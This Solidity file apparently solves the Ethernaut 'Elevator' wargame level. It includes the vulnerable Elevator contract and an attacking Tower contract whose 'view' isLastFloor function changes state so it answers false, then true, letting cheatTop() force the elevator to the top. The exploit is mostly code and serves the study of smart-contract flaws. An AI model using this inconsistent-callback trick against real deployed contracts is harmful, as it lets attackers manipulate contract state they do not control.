pragma solidity ^0.4.18;


interface Building {
  function isLastFloor(uint) view public returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}

contract Tower is Building{
    
    Elevator el;
    uint private lastFloor = 0;
    function Tower(address _targer) public{
        el = Elevator(_targer);
    }
    
    function isLastFloor(uint _floor) view public returns (bool){
        if(lastFloor == 0 || lastFloor != _floor){
            lastFloor = _floor;
            return false;
        }else if(lastFloor == _floor){
            return true;
        }
    }
    
    function cheatTop() public{
        el.goTo(100);
    }
    
}